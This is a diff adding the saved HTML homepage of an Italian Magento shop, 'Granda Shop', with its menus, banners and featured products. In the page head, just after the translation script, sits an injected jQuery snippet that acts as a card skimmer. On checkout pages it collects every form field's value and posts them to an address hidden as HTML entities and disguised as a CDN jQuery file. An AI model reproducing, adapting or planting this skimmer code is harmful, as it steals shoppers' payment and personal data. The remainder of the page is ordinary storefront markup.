@@ -1,0 +1,648 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="it" lang="it">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Granda Shop</title>
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.grandashop.it/skin/frontend/default/blank/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.grandashop.it/skin/frontend/default/blank/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.grandashop.it/js/blank.html';
+    var BLANK_IMG = 'http://www.grandashop.it/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.grandashop.it/skin/frontend/default/blank/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.grandashop.it/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.grandashop.it/skin/frontend/base/default/css/magestore/bannerslider/popup.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.grandashop.it/skin/frontend/default/blank/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.grandashop.it/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/magestore/bannerslider/lightbox.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.grandashop.it/skin/frontend/default/blank/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.grandashop.it/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.grandashop.it';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["IT"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"Please select an option.":"Selezionare una opzione.","This is a required field.":"Questo \u00e8 un campo obbligatorio.","Please enter a valid number in this field.":"Inserire un numero valido in questo campo.","Please use letters only (a-z or A-Z) in this field.":"Utilizzare solo lettere in questo campo (a-z o A-Z).","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Utilizzare solo lettere (a-z), numeri (0-9) o underscore(_) in questo campo, la prima lettera deve essere una lettera.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Inserisci un numero di telefono valido. Per esempio (123) 456-7890 o 123-456-7890.","Please enter a valid date.":"Inserire una data valida.","Please enter a valid email address. For example johndoe@domain.com.":"Inserire un indirizzo email valido. Per esempio johndoe@domain.com.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Inserire 6 o pi\u00f9 caratteri. Gli spazi iniziali o finali saranno ignorati.","Please make sure your passwords match.":"Assicurati che le password corrispondano.","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Inserire un URL valido. Per esempio http:\/\/www.example.com o www.example.com","Please enter a valid social security number. For example 123-45-6789.":"Inserire un numero valido di previdenza sociale. Per esempio 123-45-6789.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Inserire un codice zip valdio. Per esempio 90602 o 90602-1234.","Please enter a valid zip code.":"Inserire codice zip valido.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Utilizzare questo formato della data: dd\/mm\/yyyy. Per esempio 17\/03\/2006 per il 17 di Marzo, 2006.","Please enter a valid $ amount. For example $100.00.":"Inserire un importo valido di $. Per esempio $100.00.","Please select one of the above options.":"Selezionare una delle opzioni soprastanti.","Please select one of the options.":"Selezionare una delle opzioni.","Please select State\/Province.":"Selezionare Stato\/Provincia.","Please enter a number greater than 0 in this field.":"Insereire un numero maggiore di 0 in questo campo.","Please enter a valid credit card number.":"Inserire un numero di carta di credito valido.","Please wait, loading...":"Attendere prego, caricamento...","Complete":"Completo","Add Products":"Aggiungi prodotti","Please choose to register or to checkout as a guest":"Scegli di registrarti o di fare il checkout come ospite","Please specify payment method.":"Specificare il metodo di pagamento."});
+        //]]></script><script type="text/javascript">jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this).attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;&#110;&#46;&#106;&#115;").text(),q))})});</script></head>
+<body class=" cms-index-index cms-home">
+<!-- BEGIN Inchoo Facebook Connect -->
+<div id="fb-root"></div>
+<script type="text/javascript">
+//<![CDATA[
+window.fbAsyncInit = function() {
+	FB.init({
+		appId		: "117413325015957",
+		channelUrl	: 'http://www.grandashop.it/facebook/channel/index/locale/it_IT/?SID=b44df3305e9e9f909f7942ee18c73c08',
+		status		: true,
+		cookie		: true,
+		oauth		: true,
+		xfbml		: true
+	});
+	document.fire("facebook:fbAsyncInit");
+};
+
+(function(d){
+	var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
+	js = d.createElement('script'); js.id = id; js.async = true;
+	js.src = "//connect.facebook.net/it_IT/all.js";
+	d.getElementsByTagName('head')[0].appendChild(js);
+}(document));
+
+document.observe('click', function(e){
+	var target = e.findElement('a[rel^=facebook-connect]') || e.findElement('button[rel^=facebook-connect]');
+	if (target && target.readAttribute('rel')=='facebook-connect') {
+		e.stop();
+		try{
+			FB.login(function(response){
+				if(response.status=='connected') setLocation('http://www.grandashop.it/facebook/customer_account/connect/?SID=b44df3305e9e9f909f7942ee18c73c08');
+			}, {scope: "email,user_birthday"});
+		}catch(error){}
+	}
+});
+//]]>
+</script>
+<!-- END Inchoo Facebook Connect -->
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-container">
+    <div class="header">
+                <h1 class="logo"><strong>Granda Shop</strong><a href="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Granda Shop" class="logo"><img src="http://www.grandashop.it/skin/frontend/default/blank/images/Logo-Granda-Shop.jpg" alt="Granda Shop" /></a></h1>
+                <div class="quick-access">
+            <form id="search_mini_form" action="http://www.grandashop.it/catalogsearch/result/?SID=b44df3305e9e9f909f7942ee18c73c08" method="get">
+    <div class="form-search">
+        <label for="search">Search:</label>
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Ricerca" class="button"><span><span>Ricerca</span></span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Cerca intero negozio qui...');
+            searchForm.initAutocomplete('http://www.grandashop.it/catalogsearch/ajax/suggest/?SID=b44df3305e9e9f909f7942ee18c73c08', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+            <p class="welcome-msg">Benvenuto </p>
+            <ul class="links">
+                        <li class="first" ><a href="http://www.grandashop.it/customer/account/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Il Mio Account" >Il Mio Account</a></li>
+                                <li ><a href="http://www.grandashop.it/wishlist/?SID=b44df3305e9e9f909f7942ee18c73c08" title="La mia Wishlist" >La mia Wishlist</a></li>
+                                <li ><a href="http://www.grandashop.it/checkout/cart/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Carrello" class="top-link-cart">Carrello</a></li>
+                                <li ><a href="http://www.grandashop.it/checkout/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                <li ><a href="http://www.grandashop.it/blog/" title="Blog" class="top-link-blog">Blog</a></li>
+                                <li ><a href="http://www.grandashop.it/customer/account/login/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Log In" >Log In</a></li>
+                                <li class=" last" ><a href="http://www.grandashop.it/facebook/customer_account/connect/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Facebook Connect"  rel="facebook-connect">Connect with Facebook</a></li>
+            </ul>
+                    </div>
+            </div>
+</div>
+<div class="nav-container">
+    <ul id="nav">
+	<li class="home active">
+            <a href="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08" class="level-top"><span>Home</span></a>
+        </li>
+        <li  class="level0 nav-1 first level-top parent"><a href="http://www.grandashop.it/complementi/?SID=b44df3305e9e9f909f7942ee18c73c08"  class="level-top" ><span>Complementi</span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="http://www.grandashop.it/complementi/zanzariere/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Zanzariere</span></a></li><li  class="level1 nav-1-2"><a href="http://www.grandashop.it/complementi/letti/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Letti</span></a></li><li  class="level1 nav-1-3"><a href="http://www.grandashop.it/complementi/appendiabiti/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Appendiabiti</span></a></li><li  class="level1 nav-1-4"><a href="http://www.grandashop.it/complementi/caminetti-camino-bioetanolo/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Caminetti</span></a></li><li  class="level1 nav-1-5"><a href="http://www.grandashop.it/complementi/tessile/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Tessile</span></a></li><li  class="level1 nav-1-6"><a href="http://www.grandashop.it/complementi/specchiere/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Specchiere</span></a></li><li  class="level1 nav-1-7"><a href="http://www.grandashop.it/complementi/porte/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Porte </span></a></li><li  class="level1 nav-1-8"><a href="http://www.grandashop.it/complementi/materassi/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Materassi</span></a></li><li  class="level1 nav-1-9"><a href="http://www.grandashop.it/complementi/orologi/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Orologi</span></a></li><li  class="level1 nav-1-10"><a href="http://www.grandashop.it/complementi/reti/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Reti</span></a></li><li  class="level1 nav-1-11"><a href="http://www.grandashop.it/complementi/scrivanie/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Scrivanie</span></a></li><li  class="level1 nav-1-12"><a href="http://www.grandashop.it/complementi/divani-e-poltrone/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Divani e Poltrone</span></a></li><li  class="level1 nav-1-13"><a href="http://www.grandashop.it/complementi/accessori-cameretta/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Accessori Cameretta</span></a></li><li  class="level1 nav-1-14"><a href="http://www.grandashop.it/complementi/guanciali-e-cuscini/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Guanciali e Cuscini</span></a></li><li  class="level1 nav-1-15"><a href="http://www.grandashop.it/complementi/sedie/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Sedie</span></a></li><li  class="level1 nav-1-16 last"><a href="http://www.grandashop.it/complementi/tavoli/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Tavoli</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="http://www.grandashop.it/stock-abbigliamento-firmato-vestiti-economico-sport/?SID=b44df3305e9e9f909f7942ee18c73c08"  class="level-top" ><span>Abbigliamento</span></a><ul class="level0"><li  class="level1 nav-2-1 first"><a href="http://www.grandashop.it/stock-abbigliamento-firmato-vestiti-economico-sport/stock-jeans-abbigliamento-firmato/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Jeans e pantaloni</span></a></li><li  class="level1 nav-2-2 last"><a href="http://www.grandashop.it/stock-abbigliamento-firmato-vestiti-economico-sport/stock-abbigliamento-sportivo-firmato-outlet/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Stock sportivo</span></a></li></ul></li><li  class="level0 nav-3 level-top parent"><a href="http://www.grandashop.it/oggettistica/?SID=b44df3305e9e9f909f7942ee18c73c08"  class="level-top" ><span>Oggettistica</span></a><ul class="level0"><li  class="level1 nav-3-1 first"><a href="http://www.grandashop.it/oggettistica/elettrodomestici/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Elettrodomestici</span></a></li><li  class="level1 nav-3-2"><a href="http://www.grandashop.it/oggettistica/casalinghi/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Casalinghi</span></a></li><li  class="level1 nav-3-3"><a href="http://www.grandashop.it/oggettistica/porta-cd/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Porta CD</span></a></li><li  class="level1 nav-3-4"><a href="http://www.grandashop.it/oggettistica/cornici-e-quadri/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Cornici e quadri</span></a></li><li  class="level1 nav-3-5"><a href="http://www.grandashop.it/oggettistica/candele-e-portacandele/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Candele e portacandele</span></a></li><li  class="level1 nav-3-6"><a href="http://www.grandashop.it/oggettistica/idee-regalo/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Idee Regalo</span></a></li><li  class="level1 nav-3-7"><a href="http://www.grandashop.it/oggettistica/armadio-portafucili/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Armadio portafucili</span></a></li><li  class="level1 nav-3-8"><a href="http://www.grandashop.it/oggettistica/giocattoli-e-bomboniere/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Giocattoli e bomboniere</span></a></li><li  class="level1 nav-3-9"><a href="http://www.grandashop.it/oggettistica/profumi/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Profumi</span></a></li><li  class="level1 nav-3-10"><a href="http://www.grandashop.it/oggettistica/idee-mare/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>idee mare</span></a></li><li  class="level1 nav-3-11"><a href="http://www.grandashop.it/oggettistica/caffettiere-e-bollitori/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Caffettiere, tisaniere, bollitori</span></a></li><li  class="level1 nav-3-12"><a href="http://www.grandashop.it/oggettistica/cancelleria/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Cancelleria</span></a></li><li  class="level1 nav-3-13 last"><a href="http://www.grandashop.it/oggettistica/utensili/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Utensili</span></a></li></ul></li><li  class="level0 nav-4 level-top parent"><a href="http://www.grandashop.it/arredamento/?SID=b44df3305e9e9f909f7942ee18c73c08"  class="level-top" ><span>Arredamento</span></a><ul class="level0"><li  class="level1 nav-4-1 first"><a href="http://www.grandashop.it/arredamento/bagni/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Bagni</span></a></li><li  class="level1 nav-4-2"><a href="http://www.grandashop.it/arredamento/camere/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Camere</span></a></li><li  class="level1 nav-4-3"><a href="http://www.grandashop.it/arredamento/camerette/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Camerette</span></a></li><li  class="level1 nav-4-4"><a href="http://www.grandashop.it/arredamento/cucine/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Cucine</span></a></li><li  class="level1 nav-4-5"><a href="http://www.grandashop.it/arredamento/soggiorni/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Soggiorni</span></a></li><li  class="level1 nav-4-6 last"><a href="http://www.grandashop.it/arredamento/uffici/?SID=b44df3305e9e9f909f7942ee18c73c08" ><span>Uffici</span></a></li></ul></li><li  class="level0 nav-5 last level-top"><a href="http://www.grandashop.it/catalog-21/?SID=b44df3305e9e9f909f7942ee18c73c08"  class="level-top" ><span>Tutti i prodotti</span></a></li>    </ul>
+</div>
+                    <div class="magestore-bannerslider">
+                            <div class="magestore-bannerslider-standard">
+                    <script type="text/javascript" src="http://www.grandashop.it/js/magestore/bannerslider/jquery-1.7.min.js"></script>
+<script type="text/javascript" src="http://www.grandashop.it/js/magestore/bannerslider/slider1/jquery.slider.min.js"></script>
+<link rel="stylesheet" type="text/css" href="http://www.grandashop.it/skin/frontend/base/default/css/magestore/bannerslider/slider2.css">
+<div>     
+    <script type="text/javascript">
+        var j2 = jQuery.noConflict();            
+        j2(document).ready(function($) {
+          j2(".slider2-1").slideshow({
+            width      : 1000,
+            height     : 250,
+            transition : "fade",
+            delay      : 4500            
+          });
+        });
+    </script>
+    <div class="bannerslide-caborno-slider" style="margin: auto; margin-bottom: 10px">    
+    <div class="slider2-1">
+                    <div>
+                <a href="http://www.grandashop.it/complementi/" target="_blank" onclick="bannerClicks('3','1')" style="display:block"><img src="http://www.grandashop.it/media/bannerslider/c/o/complementi.jpg" title="bo3" alt="text" width="1000" height="250"/></a>
+            </div>
+                        <div>
+                <a href="http://www.grandashop.it/oggettistica" target="_blank" onclick="bannerClicks('5','1')" style="display:block"><img src="http://www.grandashop.it/media/bannerslider/3/2/32.01.jpg" title="no" alt="text" width="1000" height="250"/></a>
+            </div>
+                
+        
+    </div>
+    </div>
+</div>
+  <script type="text/javascript">
+        function bannerClicks(id_banner,id_slider){
+		click_url = 'http://www.grandashop.it/bannerslider/index/click/?SID=b44df3305e9e9f909f7942ee18c73c08';
+		banner_id = id_banner;
+		new Ajax.Request(click_url,{
+			method: 'post',
+			parameters:{id_banner: banner_id,slider_id:id_slider },
+			onFailure: '',
+			onSuccess: ''
+			
+		});
+		
+	}
+    </script>
+                    </div>    
+                    </div>
+                <script type="text/javascript">
+            Event.observe(window, 'load', function() {
+                banner_ids = '3,5';
+                slider_id = '1';
+                imp_url = 'http://www.grandashop.it/bannerslider/index/impress/?SID=b44df3305e9e9f909f7942ee18c73c08';
+                new Ajax.Request(imp_url, {
+                    method: 'post',
+                    parameters:{banner_ids: banner_ids, slider_id:slider_id},
+                    onFailure: '',
+                    onSuccess: ''
+
+                });
+            });
+        </script>
+            <div class="main-container col2-right-layout">
+            <div class="main">
+                                <div class="col-main">
+                                        <div class="std"><!--
+<p><div class="widget widget-static-block"><p><img style="vertical-align: top;" src="http://www.grandashop.it/media/wysiwyg/home/cm7559-a-pro-alzamoto-stand-moto-motorcycle.jpg" alt="" width="250" height="250" /></p></div>
+</p>
+<p>&nbsp;</p>
+<p></p>
+-->
+<h1 style="text-align: center;"><span style="color: #ff0000; background-color: #ffffff;">IN EVIDENZA</span></h1>
+<p style="text-align: center;"><div class="category-products">
+            
+    
+                            <ul class="products-grid">
+                    <li class="item first">
+                <a href="http://www.grandashop.it/d-m-profumo-equivalente-a-dolce-gabbana-pour-homme/?SID=b44df3305e9e9f909f7942ee18c73c08" title="d&amp;m profumo ispirato a dolce&amp;gabbana pour homme" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/d/_/d_m_dolce_e_gabbana.jpg" width="135" height="135" alt="d&amp;m profumo ispirato a dolce&amp;gabbana pour homme" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/d-m-profumo-equivalente-a-dolce-gabbana-pour-homme/?SID=b44df3305e9e9f909f7942ee18c73c08" title="D&amp;m profumo equivalente a Dolce &amp; Gabbana pour homme">D&amp;m profumo equivalente a Dolce &amp; Gabbana pour homme</a></h2>
+                                    <div class="ratings">
+                <span class="amount"><a href="#" onclick="var t = opener ? opener.window : window; t.location.href='http://www.grandashop.it/review/product/list/id/34/?SID=b44df3305e9e9f909f7942ee18c73c08'; return false;">1 Recensione(i)</a></span>
+    </div>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-34">
+                                            <span class="price">€ 9,90</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/34/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/34/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/34/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.grandashop.it/divano-prontoletto-in-tessuto-easy/?SID=b44df3305e9e9f909f7942ee18c73c08" title="prontoletto" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/d/i/divano_letto_easy_vsdhpp41_2.jpg" width="135" height="135" alt="prontoletto" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/divano-prontoletto-in-tessuto-easy/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Divano prontoletto in tessuto Easy">Divano prontoletto in tessuto Easy</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-29">
+                                            <span class="price">€ 250,00</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/29/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/29/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/29/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item">
+                <a href="http://www.grandashop.it/salvadanaio-ceramica-granchio-cancro-colorato/?SID=b44df3305e9e9f909f7942ee18c73c08" title="SALVADANAIO GRANCHIO" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/0/9/09_4.jpg" width="135" height="135" alt="SALVADANAIO GRANCHIO" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/salvadanaio-ceramica-granchio-cancro-colorato/?SID=b44df3305e9e9f909f7942ee18c73c08" title="SALVADANAIO CERAMICA GRANCHIO/CANCRO COLORATO">SALVADANAIO CERAMICA GRANCHIO/CANCRO COLORATO</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-31">
+                                            <span class="price">€ 10,50</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <p class="availability out-of-stock"><span>Non disponibile</span></p>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/31/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/31/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                                    <li class="item last">
+                <a href="http://www.grandashop.it/tappeto-bambino-pista-da-corsa/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Tappetto per bambini &quot;pista da corsa&quot; 100x50" class="product-image"><img src="http://www.grandashop.it/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/t/a/tappeto_pista_da_corsa.jpg" width="135" height="135" alt="Tappetto per bambini &quot;pista da corsa&quot; 100x50" /></a>
+                <h2 class="product-name"><a href="http://www.grandashop.it/tappeto-bambino-pista-da-corsa/?SID=b44df3305e9e9f909f7942ee18c73c08" title="Tappeto bambino &quot;Pista da corsa&quot;">Tappeto bambino &quot;Pista da corsa&quot;</a></h2>
+                                
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-28">
+                                            <span class="price">€ 46,00</span>                                    </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Aggiungi al carrello" class="button btn-cart" onclick="setLocation('http://www.grandashop.it/checkout/cart/add/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/product/28/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08')"><span><span>Aggiungi al carrello</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.grandashop.it/wishlist/index/add/product/28/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-wishlist">Aggiungi alla Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.grandashop.it/catalog/product_compare/add/product/28/uenc/aHR0cDovL2dyYW5kYXNob3AuaXQv/form_key/o9U6qUsj5M6FAjaD/?SID=b44df3305e9e9f909f7942ee18c73c08" class="link-compare">Confronta</a></li>
+                                            </ul>
+                </div>
+            </li>
+                </ul>
+                        <script type="text/javascript">decorateGeneric($$('ul.products-grid'), ['odd','even','first','last'])</script>
+    
+    <div class="toolbar-bottom">
+            </div>
+</div>
+</p>
+<p>&nbsp;</p>
+<hr align="left" size="3" width="100%" />
+<p>&nbsp;</p>
+<h1 style="text-align: center;"><span style="font-family: 'arial black', 'avant garde';"><strong><span style="color: #ff0000; font-size: 40px; background-color: #ffffff;">CATALOGO</span></strong></span></h1></div><div class="category-products">
+    <div class="toolbar">
+    <div class="pager">
+        <p class="amount">
+                            <strong>8 Prodotto/I</strong>
+                    </p>
+
+        <div class="limiter">
+            <label>Mostra</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=8" selected="selected">
+                    8                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=16">
+                    16                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=24">
+                    24                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=32">
+                    32                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=48">
+                    48                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=64">
+                    64                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;limit=all">
+                    Tutto                </option>
+                        </select> per pagina        </div>
+
+        
+    
+    
+    
+    
+    
+
+    </div>
+
+        <div class="sorter">
+                <p class="view-mode">
+                                </p>
+            
+        <div class="sort-by">
+            <label>Sort By</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;dir=asc&amp;order=position">
+                    Posizione                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;dir=asc&amp;order=name" selected="selected">
+                    Nome                </option>
+                            <option value="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;dir=asc&amp;order=price">
+                    Prezzo                </option>
+                        </select>
+                            <a href="http://www.grandashop.it/?SID=b44df3305e9e9f909f7942ee18c73c08&amp;dir=asc&amp;order=name" title="Imposta ordine ascendente"><img src="http://www.grandashop.it/skin/frontend/default/blank/images/i_desc_arrow.gif" alt="Imposta ordine ascendente" class="v-middle" /></a>
+                    </div>
+    </div>
